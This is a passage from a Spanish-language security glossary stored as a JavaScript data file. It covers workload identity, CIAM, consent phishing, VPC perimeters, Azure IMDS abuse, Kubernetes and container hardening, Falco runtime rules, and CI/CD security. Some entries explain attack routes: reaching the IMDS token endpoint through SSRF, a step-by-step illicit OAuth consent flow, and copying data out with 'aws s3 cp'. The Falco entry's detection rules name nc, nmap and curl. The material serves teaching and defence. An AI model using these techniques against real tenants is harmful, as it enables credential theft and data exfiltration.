      "Un pipeline de GitHub Actions o un cluster on-prem tradicionalmente accede a la nube con una **clave de service account** guardada como secret. Esas claves **no caducan**, se filtran en logs y son objetivo #1 de exfiltración.\n" +
      "\n**Workload Identity Federation** cambia el modelo:\n" +
      "1. El CI ya tiene una **identidad OIDC** propia (GitHub Actions emite un JWT por cada job).\n" +
      "2. Configuras GCP/Azure para **confiar** en ese IdP externo con un mapeo de claim → identidad cloud.\n" +
      "3. El job intercambia su JWT por credenciales cloud **temporales**.\n" +
      "\nResultado: **cero secretos long-lived** en el repo del CI.\n" +
      "\n**Ejemplo GCP:**\n" +
      "```yaml\n- uses: google-github-actions/auth@v2\n  with:\n    workload_identity_provider: 'projects/12345/locations/global/workloadIdentityPools/github-pool/providers/github-provider'\n    service_account: 'ci-deployer@my-project.iam.gserviceaccount.com'\n```\n" +
      "\n**Condiciones críticas en el mapeo** — sin ellas, cualquier repo de GitHub del mundo puede impersonar:\n" +
      "```\nattribute.repository == 'miorg/mirepo'\nattribute.ref == 'refs/heads/main'\nattribute.environment == 'production'\n```\n" +
      "> 💡 AWS tiene el equivalente vía `AssumeRoleWithWebIdentity`; Azure lo llama **Federated Credentials**.\n" +
      "> ⚠️ Sin `attribute_condition` explícita, un WIF pool acepta CUALQUIER repo con OIDC de GitHub. Ha habido incidentes públicos (2023) por esto.",
    examples: [
      "GitHub Actions → GCP: deploy sin JSON keys, con condition `repository == 'miorg/mirepo'`.",
      "Terraform Cloud → AWS con OIDC en vez de access keys estáticas.",
      "GKE cluster on-prem → BigQuery vía Workload Identity Federation.",
    ],
    related: ["STS y credenciales temporales", "GCP IAM", "OIDC federation en CI/CD", "Cross-account roles y confused deputy"],
  },
  {
    id: 495,
    module: 46,
    term: "Azure AD B2C y CIAM en cloud",
    short: "IAM para tus clientes finales (no empleados): registro social, MFA, self-service, escalado a millones.",
    detail:
      "**CIAM** (*Customer Identity and Access Management*) es la contraparte del IAM interno: gestiona identidades de **usuarios finales** (millones de consumidores) en vez de empleados. Requisitos distintos:\n" +
      "\n| Aspecto | Enterprise IAM | CIAM |\n" +
      "|---|---|---|\n" +
      "| Escala | Miles | Millones+ |\n" +
      "| UX | Fricción aceptable | Fricción = churn |\n" +
      "| Login social | Raro | Central (Google, Apple, etc.) |\n" +
      "| Consent | Interno | GDPR/CCPA compliance |\n" +
      "| Self-service | Limitado | Total (registro, reset, borrado) |\n" +
      "\n**Servicios cloud gestionados:**\n" +
      "• **Azure AD B2C** — tenant separado del Entra corporativo, custom policies (XML/YAML), user flows.\n" +
      "• **GCP Identity Platform** — Firebase Auth como base, escala a millones, MFA, phone auth.\n" +
      "• **AWS Cognito User Pools** — el equivalente en AWS, con Lambda triggers para custom flows.\n" +
      "• **Auth0** / **Okta CIC** — SaaS neutrales, muy usados por PYMEs sin infra cloud fuerte.\n" +
      "\n> 💡 Un error común: usar el Entra ID corporativo (para empleados) como IdP de la app pública. Termina en confusión de tenants, políticas cruzadas y problemas de GDPR.\n" +
      "> ⚠️ CIAM requiere **passkeys / passwordless** desde el diseño: los clientes olvidan contraseñas mucho más que los empleados y los resets débiles son vector de ATO (account takeover).",
    examples: [
      "App SaaS con Cognito User Pool + Google/Apple SSO + passkeys.",
      "E-commerce con Azure AD B2C: registro con teléfono, MFA opcional, borrado GDPR self-service.",
      "Fintech con Identity Platform + step-up MFA solo en pagos.",
    ],
    related: ["Azure AD / Entra ID y RBAC", "Autenticación passwordless", "SSO y federación", "MFA y autenticación moderna"],
  },
  {
    id: 496,
    module: 46,
    term: "Consent phishing (illicit OAuth grant)",
    short: "El atacante no roba credenciales: engaña al usuario para que consienta permisos OAuth a una app maliciosa.",
    detail:
      "En vez de robar contraseña + MFA, el atacante monta una app OAuth registrada en el tenant (Entra, Google) o convence al usuario de instalar una app externa. El flujo:\n" +
      "\n1. Víctima recibe email: *\"Instala este addon de Outlook Analytics\"*.\n" +
      "2. Click → pantalla legítima de Microsoft: *\"¿Concedes a X los permisos: `Mail.Read`, `Files.Read.All`, `offline_access`?\"*.\n" +
      "3. Víctima acepta (pantalla oficial, MFA ya cumplido).\n" +
      "4. Atacante obtiene **refresh token** con esos permisos. **Persiste sin necesitar contraseña ni MFA jamás**.\n" +
      "\n**Por qué es devastador:**\n" +
      "• MFA no ayuda — el usuario ya estaba autenticado cuando consintió.\n" +
      "• Cambio de contraseña no revoca — el refresh token vive por su cuenta.\n" +
      "• Difícil de detectar sin auditoría de app consents.\n" +
      "\n**Contramedidas:**\n" +
      "• **Admin consent workflow** — solo apps aprobadas por IT pueden ser consentidas por usuarios.\n" +
      "• **Consent policies** que restringen scopes peligrosos (`Mail.Read.All`, `Directory.Read.All`).\n" +
      "• **Auditoría de app registrations** con Microsoft Graph / Google Admin.\n" +
      "• **Revocación** desde `oauth2PermissionGrants` en Entra.\n" +
      "> 💡 Casos reales: campañas Konni (2023), OceanLotus (2022), varias contra Ucrania (2022) usaron consent phishing.\n" +
      "> ⚠️ En Entra por defecto **cualquier usuario** puede consentir apps de terceros. Hay que ir a Entra → Enterprise Applications → Consent and permissions → configurar restricted.",
    examples: [
      "Campaign Konni 2023: app OAuth 'Mail Analyzer' con permisos Mail.ReadWrite + offline_access.",
      "Restricted consent policy en Entra: solo scopes de baja severidad son user-consentable.",
      "Detección: alerta si aparece una app OAuth nueva con >10 consents en un día.",
    ],
    related: ["Ataques a MFA", "Azure AD / Entra ID y RBAC", "Ingeniería social", "MFA y autenticación moderna"],
  },
  {
    id: 497,
    module: 46,
    term: "VPC Service Controls y Private Endpoints",
    short: "Perímetros lógicos que impiden que un actor autorizado exfiltre datos fuera del perímetro cloud.",
    detail:
      "IAM contesta *¿quién puede acceder?*. Pero un usuario legítimo con acceso legítimo puede **filtrar datos fuera de la organización** (insider threat, credenciales robadas). Los perímetros lógicos cierran esa vía:\n" +
      "\n**GCP VPC Service Controls (VPC-SC):**\n" +
      "• Define un **service perimeter** (BigQuery, Cloud Storage, etc.).\n" +
      "• Requests que **cruzan el perímetro** son bloqueadas: aunque tengas IAM, un `gsutil cp` desde tu laptop de casa a un bucket protegido falla.\n" +
      "• Combinable con **access levels** (contexto: IP, device state, geo, hora).\n" +
      "\n**Azure Private Endpoints + Private Link:**\n" +
      "• El recurso (Storage, SQL) se accede vía una IP privada de tu VNet.\n" +
      "• El endpoint público se puede **desactivar** (deny public network access).\n" +
      "• El tráfico nunca sale a Internet.\n" +
      "\n**AWS: VPC Endpoints + endpoint policies:**\n" +
      "• Los servicios AWS se acceden por endpoints privados con policies restrictivas.\n" +
      "• `aws:PrincipalOrgID` en la endpoint policy corta exfiltración a otras orgs.\n" +
      "\n> 💡 Sin perímetros, un pentester que obtiene una IAM key filtra a un bucket propio con `aws s3 cp`. Con VPC-SC / private endpoints, ese `cp` no sale del perímetro aunque la IAM key sea válida.\n" +
      "> ⚠️ Los perímetros bloquean también accesos legítimos mal configurados. Piloto en modo **dry-run** primero, revisar los logs de bloqueo, luego enforce.",
    examples: [
      "VPC-SC alrededor de BigQuery de producción: exportación bloqueada aunque el user tenga BQ Admin.",
      "Azure SQL con `publicNetworkAccess: Disabled` + private endpoint desde la VNet.",
      "AWS S3 con endpoint policy: `Deny` si `aws:PrincipalOrgID != o-mi-org`.",
    ],
    related: ["Cloud hardening y CSPM", "GCP IAM", "Cross-account roles y confused deputy", "Service Control Policies (SCPs)"],
  },
  {
    id: 498,
    module: 46,
    term: "Managed Identities y abuso de IMDS",
    short: "En Azure, las Managed Identities son el equivalente al rol IAM de EC2; el mismo SSRF a metadata las expone.",
    detail:
      "Una **Managed Identity** en Azure es una identidad automática asignada a una VM, App Service, Function o cualquier recurso que necesite hablar con otros recursos Azure. Elimina el problema de guardar credenciales, pero introduce el **mismo vector que IMDSv1 en AWS**: el endpoint IMDS.\n" +
      "\n**Endpoint IMDS de Azure:** `http://169.254.169.254/metadata/identity/oauth2/token`\n" +
      "\n**Diferencias con AWS:**\n" +
      "| | AWS IMDS | Azure IMDS |\n" +
      "|---|---|---|\n" +
      "| Endpoint | Mismo IP link-local | Mismo IP link-local |\n" +
      "| Header requerido | v1: ninguno / v2: `X-aws-ec2-metadata-token` | `Metadata: true` en el request |\n" +
      "| SSRF típico | Muchos bypass IMDSv1 | El header `Metadata: true` es raro que un SSRF pueda inyectar |\n" +
      "| Bypass | Hop limit >1 en Docker/K8s | Similares con pods en AKS sin restricciones |\n" +
      "\n**Contramedidas:**\n" +
      "• Preferir **User-Assigned Managed Identity** (asignable a varios recursos, se puede revocar sin borrar la VM) sobre System-Assigned.\n" +
      "• Restringir con **Azure Policy** los recursos que pueden tener MI con roles privilegiados.\n" +
      "• Auditar con **Defender for Cloud** logs de `ManagedIdentityTokenAcquired` fuera del contexto esperado.\n" +
      "• En AKS: usar **Azure AD Workload Identity** (basado en OIDC federation) en vez de MSI, para pods.\n" +
      "> 💡 En 2021 un SSRF en Azure Functions vía Node.js permitió leer el MSI token; hoy los runtimes filtran el header por defecto.\n" +
      "> ⚠️ Igual que en AWS, un contenedor con acceso al IMDS del host hereda su Managed Identity. Trailblazer/Kubelet configs deben aislar 169.254.169.254.",
    examples: [
      "AKS con Azure AD Workload Identity: pod pide token OIDC → intercambia por token Managed → sin exposición IMDS del nodo.",
      "Function App con MSI que solo puede leer un Key Vault específico (RBAC scoped).",
      "Defender alert: MSI token adquirido desde un IP externa al recurso.",
    ],
    related: ["IMDSv2 y SSRF a metadata", "Azure AD / Entra ID y RBAC", "Workload Identity Federation (WIF)", "Workload Identity en Kubernetes (IRSA / GKE WI / AKS Pod Identity)"],
  },

  // ── M47 · Container Security ──────────────────────────────────────────────
  {
    id: 500,
    module: 47,
    term: "Seguridad de Docker e imágenes",
    short: "Las imágenes de contenedor deben ser mínimas, sin secretos y de origen confiable.",
    detail:
      "Una **imagen** de contenedor empaqueta app + dependencias en **capas**. Riesgos: imágenes base con vulnerabilidades, **secretos embebidos** (claves en una capa), correr como **root**. Buenas prácticas: imágenes mínimas (distroless), usuario no-root, no incluir secretos.\n" +
      "USER 1000\n" +
      "> ⚠️ Un secreto añadido y luego 'borrado' sigue estando en una **capa anterior** de la imagen.",
    examples: [
      "Usar una imagen distroless en vez de una con todo un SO.",
      "Pasar secretos por variables/volúmenes, nunca dentro de la imagen.",
    ],
    related: ["Image scanning", "Kubernetes security (RBAC)", "Pod security y network policies"],
  },
  {
    id: 501,
    module: 47,
    term: "Image scanning",
    short: "Analizar las imágenes en busca de vulnerabilidades y secretos antes de desplegarlas.",
    detail:
      "El **image scanning** revisa cada capa contra bases de CVEs y busca secretos/malas configuraciones. Herramientas: **Trivy**, **Grype**, **Clair**. Se integra en el pipeline para **bloquear** imágenes con vulnerabilidades críticas antes del despliegue.\n" +
      "trivy image miapp:latest\n" +
      "> 💡 Escanear en el registro y en el CI evita que llegue a producción una imagen vulnerable.",
    examples: [
      "trivy bloqueando un build por una CVE crítica en la imagen base.",
      "Escaneo programado de las imágenes del registro.",
    ],
    related: ["Seguridad de Docker e imágenes", "Dependency scanning (SCA)"],
  },
  {
    id: 502,
    module: 47,
    term: "Kubernetes security (RBAC)",
    short: "Controlar quién y qué puede hacer cada cosa dentro del clúster.",
    detail:
      "**Kubernetes** orquesta contenedores y su seguridad arranca en el **RBAC** del clúster: roles que limitan qué puede hacer cada usuario/service account sobre los recursos (pods, secrets). Otros pilares: proteger el **API server** y el **etcd**, y no dar permisos de cluster-admin a la ligera.\n" +
      "> ⚠️ Un service account con permisos excesivos montado en un pod comprometido = compromiso del clúster.",
    examples: [
      "Un Role que solo permite leer pods en un namespace.",
      "Deshabilitar el automount del token de service account cuando no se usa.",
    ],
    related: ["Pod security y network policies", "Seguridad de Docker e imágenes", "Principio de mínimo privilegio"],
  },
  {
    id: 503,
    module: 47,
    term: "Pod security y network policies",
    short: "Restringir lo que un pod puede hacer y con quién puede hablar.",
    detail:
      "Dos controles clave dentro del clúster:\n" +
      "• **Pod Security** (Standards/admission) — impide pods privilegiados, root, o con acceso al host.\n" +
      "• **Network Policies** — firewall entre pods: por defecto todo se habla con todo; una política restringe el tráfico (ej. el frontend solo habla con el backend).\n" +
      "> 💡 Sin network policies, un pod comprometido puede moverse lateralmente a todo el clúster.",
    examples: [
      "Una NetworkPolicy que aísla la base de datos del resto de pods.",
      "Bloquear pods privilegiados con Pod Security Admission.",
    ],
    related: ["Kubernetes security (RBAC)", "DMZ y segmentación de red", "Seguridad de Docker e imágenes"],
  },
  {
    id: 504,
    module: 47,
    term: "Workload Identity en Kubernetes (IRSA / GKE WI / AKS Pod Identity)",
    short: "Los pods asumen roles cloud sin credenciales estáticas: el mismo patrón de WIF, dentro del cluster.",
    detail:
      "Un pod en Kubernetes tradicionalmente accede a AWS/GCP/Azure usando **credenciales del nodo** (rol de la EC2/VM) o una **key montada en un secret**. Ambos son inseguros: cualquier pod hereda todos los permisos del nodo, o las keys viven eternamente en etcd.\n" +
      "\n**Workload Identity** — cada pod obtiene su **propia identidad cloud** derivada de su ServiceAccount K8s:\n" +
      "\n**AWS: IRSA (IAM Roles for Service Accounts)**\n" +
      "```yaml\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: mi-sa\n  annotations:\n    eks.amazonaws.com/role-arn: arn:aws:iam::123:role/pod-role\n```\n" +
      "El pod recibe un JWT proyectado que intercambia por credenciales STS vía `AssumeRoleWithWebIdentity`.\n" +
      "\n**GCP: Workload Identity**\n" +
      "```yaml\nmetadata:\n  annotations:\n    iam.gke.io/gcp-service-account: mi-gsa@proyecto.iam.gserviceaccount.com\n```\n" +
      "El KSA (Kubernetes SA) impersona el GSA (Google SA) automáticamente.\n" +
      "\n**Azure: AAD Workload Identity** (successor de Pod Identity, deprecado en 2023)\n" +
      "```yaml\nmetadata:\n  labels:\n    azure.workload.identity/use: 'true'\n  annotations:\n    azure.workload.identity/client-id: <UUID>\n```\n" +
      "OIDC federation entre AKS y Entra.\n" +
      "\n> 💡 Antes de Workload Identity, un pod hostile en un cluster podía llegar al IMDS del nodo (169.254.169.254) y **heredar el rol admin del nodo entero**. Workload Identity aisla cada pod a su propio rol.\n" +
      "> ⚠️ Solo funciona si el cluster tiene OIDC issuer expuesto y el trust policy en cloud referencia ese issuer + el sub del SA. Un error tipográfico en el `sub` deja el rol asumible por cualquier SA.",
    examples: [
      "EKS pod app-a → rol S3-read-only, pod app-b → rol S3-write, sin compartir el rol del nodo.",
      "GKE pod → BigQuery: el KSA impersona el GSA solo si su namespace es 'production'.",
      "AKS + Azure Workload Identity → Key Vault reads sin secrets en pod spec.",
    ],
    related: ["Kubernetes security (RBAC)", "Workload Identity Federation (WIF)", "STS y credenciales temporales", "Managed Identities y abuso de IMDS"],
  },
  {
    id: 505,
    module: 47,
    term: "Admission controllers (OPA/Kyverno)",
    short: "Política declarativa en el ingreso del cluster: rechaza el YAML que no cumple antes de que se despliegue.",
    detail:
      "Un **admission controller** intercepta cada request al API server de Kubernetes **antes** de que el objeto se persista en etcd. Puede **validar** (`ValidatingAdmissionWebhook`) o **mutar** (`MutatingAdmissionWebhook`). Es la última línea de defensa antes de que un pod problemático corra.\n" +
      "\n**Herramientas modernas:**\n" +
      "| Herramienta | Lenguaje | Fortaleza |\n" +
      "|---|---|---|\n" +
      "| **OPA + Gatekeeper** | Rego | Ecosistema maduro, políticas complejas |\n" +
      "| **Kyverno** | YAML (nativo K8s) | UX simple, curva plana |\n" +
      "| **Kubernetes ValidatingAdmissionPolicy** | CEL | Nativo desde 1.30, sin webhook externo |\n" +
      "\n**Políticas típicas:**\n" +
      "• Ningún pod con `hostNetwork: true`, `privileged: true`, ni root user.\n" +
      "• Todas las imágenes deben venir del registry `ghcr.io/miorg/*` (no Docker Hub).\n" +
      "• Todos los deployments deben tener `resources.limits` y `livenessProbe`.\n" +
      "• Bloquear service accounts sin `automountServiceAccountToken: false` cuando no lo necesitan.\n" +
      "• Requerir firmas cosign en imágenes de producción.\n" +
      "\n> 💡 Los admission controllers reemplazan a **Pod Security Policies** (deprecadas en K8s 1.25). Kyverno + PSA (Pod Security Admission built-in) es el reemplazo canónico.\n" +
      "> ⚠️ Un admission webhook caído o mal configurado puede **bloquear el cluster entero**. Configurar `failurePolicy: Ignore` para políticas no críticas y `Fail` solo para las que realmente lo requieran.",
    examples: [
      "Gatekeeper policy: rechaza deployment sin `runAsNonRoot: true`.",
      "Kyverno mutación: agrega automáticamente `imagePullSecrets` al deploy.",
      "ValidatingAdmissionPolicy (CEL): bloquea PVC > 100Gi sin aprobación.",
    ],
    related: ["Kubernetes security (RBAC)", "Pod security y network policies", "Supply chain de imágenes (cosign / Sigstore / SLSA)", "Runtime detection (Falco)"],
  },
  {
    id: 506,
    module: 47,
    term: "Runtime detection (Falco)",
    short: "Detecta comportamiento anómalo del contenedor en runtime: syscalls, exec inesperados, escritura a paths sensibles.",
    detail:
      "El **image scanning** y los **admission controllers** operan **antes** del deploy. Falco opera **en runtime**: monitoriza syscalls a través de eBPF (o kernel module) y dispara alertas cuando detecta comportamiento anómalo.\n" +
      "\n**Reglas built-in típicas (Falco default rules):**\n" +
      "• Shell interactiva dentro de un contenedor (`bash`, `sh` en un pod que no debería tener shell).\n" +
      "• Escritura a `/etc/`, `/bin/`, `/sbin/` desde un contenedor.\n" +
      "• Conexión de red hacia un endpoint no whitelisted.\n" +
      "• Lectura de secretos de service account cuando no debería.\n" +
      "• Ejecución de binarios sospechosos (`nc`, `nmap`, `curl` en containers que no los tienen).\n" +
      "• Contenedor escapando (mounts en `/proc/self/mem`).\n" +
      "\n**Sintaxis de una regla:**\n" +
      "```yaml\n- rule: Shell en contenedor de producción\n  desc: Detectar exec de shell en pods de producción\n  condition: >\n    container.image.repository startswith 'ghcr.io/miorg/' and\n    proc.name in (shell_binaries) and\n    k8s.ns.name = 'production'\n  output: 'Shell en pod prod (%container.name %proc.cmdline)'\n  priority: WARNING\n```\n" +
      "\n**Integraciones:** Falco → Falcosidekick → Slack / SIEM / SOAR. Nube: **AWS GuardDuty runtime monitoring** usa Falco under the hood; **GCP Security Command Center** tiene equivalente; **Sysdig Secure** es el fork comercial con más features.\n" +
      "> 💡 Falco es **CNCF Graduated** desde 2024 — es el estándar de facto para runtime detection en K8s.\n" +
      "> ⚠️ Falco genera ruido si no se tunea. Priorizar rules por criticidad y filtrar contenedores conocidos (log collectors, monitoring) que legítimamente hacen syscalls raros.",
    examples: [
      "Alerta Falco: 'Shell en pod prod' cuando alguien hace `kubectl exec`.",
      "Detección de crypto miner: proceso con >90% CPU + conexión a pool conocido.",
      "Cryptojacking en un pod comprometido: Falco alerta antes que el billing.",
    ],
    related: ["Kubernetes security (RBAC)", "Admission controllers (OPA/Kyverno)", "Seguridad de Docker e imágenes", "Pod security y network policies"],
  },
  {
    id: 507,
    module: 47,
    term: "Supply chain de imágenes (cosign / Sigstore / SLSA)",
    short: "Firmar criptográficamente las imágenes y verificar procedencia al desplegar: la respuesta a SolarWinds en el mundo de contenedores.",
    detail:
      "Post-SolarWinds (2020) el foco se desplazó a la **cadena de suministro**: ¿cómo sé que la imagen `myapp:v1.2.3` es la que compiló mi CI y no la que un atacante inyectó en el registry?\n" +
      "\n**cosign** (parte de Sigstore) firma imágenes con un par de claves o con **identidad OIDC** (keyless signing):\n" +
      "```bash\ncosign sign --identity-token $OIDC_TOKEN registry/miapp:v1.2.3\ncosign verify --certificate-identity-regexp='https://github.com/miorg/.*' registry/miapp:v1.2.3\n```\n" +
      "\n**Keyless signing** — sin gestionar claves privadas. El JWT del CI se firma; Sigstore emite un certificado corto (10 min) y lo publica en el **transparency log público (Rekor)**. Cualquiera puede verificar sin credenciales.\n" +
      "\n**SLSA** (Supply-chain Levels for Software Artifacts) — framework de niveles:\n" +
      "| Nivel | Requisito clave |\n" +
      "|---|---|\n" +
      "| L1 | Build automatizado, provenance existe |\n" +
      "| L2 | Build service, provenance firmado |\n" +
      "| L3 | Build platform aislada, source hermético |\n" +
      "| L4 | Two-party review, reproducibilidad (aspiracional) |\n" +
      "\n**Enforcement en el deploy:**\n" +
      "• Kyverno / Gatekeeper policy: rechaza pods cuya imagen no tenga firma cosign válida del CI oficial.\n" +
      "• Sigstore policy-controller (nativo K8s admission) verifica automáticamente.\n" +
      "\n> 💡 GitHub, Kubernetes, Distroless, npm/PyPI ya publican con provenance SLSA L3.\n" +
      "> ⚠️ Firmar la imagen no es suficiente — hay que verificar en el deploy. Muchas orgs firman pero nunca configuran el admission controller para bloquear las no firmadas.",
    examples: [
      "GitHub Actions con cosign keyless → firma cada imagen build → Kyverno policy en prod rechaza no firmadas.",
      "SLSA provenance L3: `cosign download attestation` muestra el commit, el workflow y el builder.",
      "Auditoría con `rekor-cli` para ver quién firmó una imagen y cuándo.",
    ],
    related: ["Seguridad de Docker e imágenes", "Image scanning", "SLSA (Supply-chain Levels for Software Artifacts)", "Admission controllers (OPA/Kyverno)"],
  },
  {
    id: 508,
    module: 47,
    term: "Secrets externos (Vault CSI / External Secrets Operator)",
    short: "Los pods leen secretos de un vault externo (Vault, AWS Secrets Manager) en runtime, no los tienen en el YAML.",
    detail:
      "Los Kubernetes Secrets son `base64` (no cifrado real) en etcd. Aunque etcd esté cifrado en reposo, los secrets siguen visibles para cualquiera con `kubectl get secret`. Peor: los secrets en el repo (aunque cifrados con SOPS/SealedSecrets) siguen expuestos al pipeline.\n" +
      "\n**El patrón moderno: leer secrets de un vault externo en runtime.**\n" +
      "\n**Vault CSI Provider** (HashiCorp):\n" +
      "```yaml\nkind: SecretProviderClass\nspec:\n  provider: vault\n  parameters:\n    vaultAddress: 'https://vault.miorg.com'\n    roleName: 'app-role'\n    objects: |\n      - objectName: 'db-password'\n        secretPath: 'secret/data/prod/db'\n        secretKey: 'password'\n```\n" +
      "El pod monta el secret como archivo o env var. El vault autentica al pod con su ServiceAccount K8s.\n" +
      "\n**External Secrets Operator (ESO):**\n" +
      "• Sincroniza secretos de AWS Secrets Manager / GCP Secret Manager / Azure Key Vault / Vault a Kubernetes Secrets.\n" +
      "• Ventaja: apps existentes leen del K8s Secret normal, sin cambios de código.\n" +
      "• Trade-off: el secret sí toca etcd (aunque con TTL y rotación automática).\n" +
      "\n**Comparación:**\n" +
      "| | Vault CSI | ESO |\n" +
      "|---|---|---|\n" +
      "| Secret en etcd | No (memoria del pod) | Sí (sincronizado) |\n" +
      "| Rotación | Automática al restart | Sync interval |\n" +
      "| Cambio de app | Puede requerir refactor | Ninguno |\n" +
      "\n> 💡 Combinado con **Workload Identity** en el cluster, el pod autentica al vault sin credenciales estáticas.\n" +
      "> ⚠️ SealedSecrets/SOPS cifran el YAML en el repo pero el secret desencriptado vive en etcd. Vault CSI es la única forma real de mantenerlo fuera del cluster.",
    examples: [
      "AKS pod → Azure Key Vault via CSI + Workload Identity: DB password nunca toca YAML ni etcd.",
      "EKS pod → AWS Secrets Manager vía ESO: rotación cada 24h automática, app inconsciente.",
      "GKE pod → GCP Secret Manager con CSI: secret montado como `/etc/secrets/db-pass`.",
    ],
    related: ["Kubernetes security (RBAC)", "Workload Identity en Kubernetes (IRSA / GKE WI / AKS Pod Identity)", "Seguridad de Docker e imágenes", "Seguridad del pipeline y secretos"],
  },

  // ── M48 · DevSecOps y CI/CD ──────────────────────────────────────────────
  {
    id: 510,
    module: 48,
    term: "Shift-left",
    short: "Integrar la seguridad desde el inicio del desarrollo, no al final.",
    detail:
      "**Shift-left** desplaza la seguridad **hacia la izquierda** del ciclo de vida: en vez de auditar al final (caro y tardío), se valida desde el **diseño y el código**. La idea: encontrar y arreglar fallos **lo antes posible**, cuando cuestan mucho menos.\n" +
      "> 💡 Un bug de seguridad cuesta órdenes de magnitud más arreglarlo en producción que en el código.",
    examples: [
      "Threat modeling en la fase de diseño de una feature.",
      "Linters de seguridad que corren en cada commit.",
    ],
    related: ["SAST y DAST", "Infrastructure as Code (IaC)"],
  },
  {
    id: 511,
    module: 48,
    term: "SAST y DAST",
    short: "Analizar el código (estático) y la app corriendo (dinámico) en busca de fallos.",
    detail:
      "Dos enfoques complementarios:\n" +
      "| | SAST | DAST |\n" +
      "|---|---|---|\n" +
      "| Qué analiza | El código fuente | La app en ejecución |\n" +
      "| Cuándo | Temprano (sin ejecutar) | Más tarde (app desplegada) |\n" +
      "| Ve | Bugs en el código | Fallos visibles desde fuera |\n" +
      "Ejemplos: **Semgrep/SonarQube** (SAST), **OWASP ZAP** (DAST).",
    examples: [
      "Semgrep detectando una query SQL concatenada (SAST).",
      "OWASP ZAP probando XSS contra el entorno de staging (DAST).",
    ],
    related: ["Shift-left", "Dependency scanning (SCA)"],
  },
  {
    id: 512,
    module: 48,
    term: "Dependency scanning (SCA)",
    short: "Detectar vulnerabilidades conocidas en las librerías de terceros.",
    detail:
      "El **SCA** (*Software Composition Analysis*) inventaría las **dependencias** y las compara con bases de CVEs, ya que el grueso del código moderno es de terceros (OWASP A06). Herramientas: **Dependabot**, **Snyk**, `npm audit`. También vigila licencias.\n" +
      "npm audit --audit-level=high\n" +
      "> 💡 Es la defensa directa contra el riesgo 'Vulnerable and Outdated Components' del OWASP Top 10.",
    examples: [
      "Dependabot abriendo un PR para parchear una librería con CVE.",
      "Bloquear el build si hay una dependencia con vuln crítica.",
    ],
    related: ["Vulnerable and Outdated Components", "Image scanning"],
  },
  {
    id: 513,
    module: 48,
    term: "Seguridad del pipeline y secretos",
    short: "El propio CI/CD es un objetivo: protege sus credenciales y su integridad.",
    detail:
      "El pipeline de CI/CD tiene acceso a código, credenciales y producción, así que es un blanco (cadena de suministro). Controles: **gestión de secretos** (vaults, no en el repo), **mínimo privilegio** de los runners, **firmar artefactos** y proteger la configuración del pipeline.\n" +
      "> ⚠️ Un secreto hardcodeado en el repo o en logs del CI es de los hallazgos más explotados.",
    examples: [
      "Inyectar secretos desde un vault, nunca commitearlos.",
      "Escaneo de secretos (gitleaks) en cada push.",
    ],
    related: ["Software and Data Integrity Failures", "Infrastructure as Code (IaC)"],
  },
  {
    id: 514,
    module: 48,
    term: "Infrastructure as Code (IaC)",
    short: "Definir la infraestructura en código permite versionarla y escanearla.",
    detail:
      "La **IaC** (Terraform, CloudFormation) declara la infraestructura como **código**, lo que la hace **reproducible, versionable y auditable**. Su seguridad: **escanear** las plantillas (tfsec, Checkov) para detectar malas configuraciones (un bucket público, un SG abierto) **antes** de desplegar.\n" +
      "tfsec ./infra\n" +
      "> 💡 Arreglar una mala config en el código IaC la corrige en todos los entornos a la vez.",
    examples: [
      "Checkov detectando un security group con 0.0.0.0/0 en el plan.",
      "Revisar el plan de Terraform en el PR antes del apply.",
    ],
    related: ["Seguridad del pipeline y secretos", "Cloud hardening y CSPM", "Shift-left"],
  },
  {
    id: 515,
    module: 48,
    term: "OIDC federation en CI/CD",
    short: "GitHub Actions / GitLab / CircleCI emiten un JWT por job y lo federan a cloud: cero secrets long-lived.",
    detail:
      "El paradigma pre-2021: cada pipeline guarda una **access key long-lived** de AWS/GCP/Azure como secret. Problemas: keys rotan raramente, filtran en logs, se comparten entre workflows.\n" +
      "\n**El nuevo paradigma:** cada plataforma CI moderna emite un **JWT firmado** por cada job. Ese JWT contiene claims verificables (`repo`, `ref`, `workflow`, `actor`). Cloud confía en el issuer y intercambia el JWT por credenciales temporales.\n" +
      "\n**GitHub Actions → AWS:**\n" +
      "```yaml\n- name: Configure AWS credentials\n  uses: aws-actions/configure-aws-credentials@v4\n  with:\n    role-to-assume: arn:aws:iam::123:role/gha-deployer\n    aws-region: us-east-1\n```\nBackend: `AssumeRoleWithWebIdentity` con el JWT como asertion. El trust policy del rol IAM confía en `token.actions.githubusercontent.com` y filtra por `repo:miorg/mirepo:ref:refs/heads/main`.\n" +
      "\n**Ejemplos por plataforma:**\n" +
      "| CI | JWT issuer | Cloud |\n" +
      "|---|---|---|\n" +
      "| GitHub Actions | `token.actions.githubusercontent.com` | AWS/GCP/Azure/HashiCorp |\n" +
      "| GitLab CI | `<gitlab-url>` | Idem |\n" +
      "| CircleCI | `oidc.circleci.com/org/<org-id>` | Idem |\n" +
      "| Buildkite | `agent.buildkite.com` | Idem |\n" +
      "\n**Claims que hay que filtrar en el trust policy** — sin ellos, cualquier repo puede impersonar:\n" +
      "```json\n\"StringEquals\": {\n  \"token.actions.githubusercontent.com:sub\": \"repo:miorg/mirepo:environment:production\",\n  \"token.actions.githubusercontent.com:aud\": \"sts.amazonaws.com\"\n}\n```\n" +
      "> 💡 **GitHub Environments** protegen el OIDC: un job solo obtiene claims de `environment:production` si el workflow declara ese environment (y GitHub aplica reglas de approval).\n" +
      "> ⚠️ Un trust policy con `\"sub\": \"repo:miorg/*\"` (comodín) permite a **cualquier repo** de la org asumir el rol — hallazgo real en varios pentests 2023.",
    examples: [
      "Migración de AWS access keys → OIDC en 200 repos: cero secretos guardados en GitHub.",
      "GitLab → GCP con WIF: deploy solo si `ref == 'refs/heads/main'` y `project_path == 'miorg/prod'`.",
      "Rotación de crisis: comprometido un access key → borrar el rol OIDC, no rotar 50 secrets.",
    ],
    related: ["Workload Identity Federation (WIF)", "STS y credenciales temporales", "Seguridad del pipeline y secretos", "Cross-account roles y confused deputy"],
  },
  {
    id: 516,
    module: 48,
    term: "SCIM SaaS-to-SaaS provisioning",
    short: "Un IdP sincroniza altas/bajas de usuarios a decenas de SaaS automáticamente, cerrando el gap del deprovisioning.",
    detail:
      "**SCIM** (*System for Cross-domain Identity Management*, RFC 7644) es una API REST estandarizada para gestionar identidades entre sistemas. Cada SaaS (Slack, GitHub, Notion, AWS SSO, Jira) expone un endpoint SCIM; el IdP (Okta, Entra, Google Workspace, JumpCloud) escribe ahí.\n" +
      "\n**Endpoints SCIM estándar:**\n" +
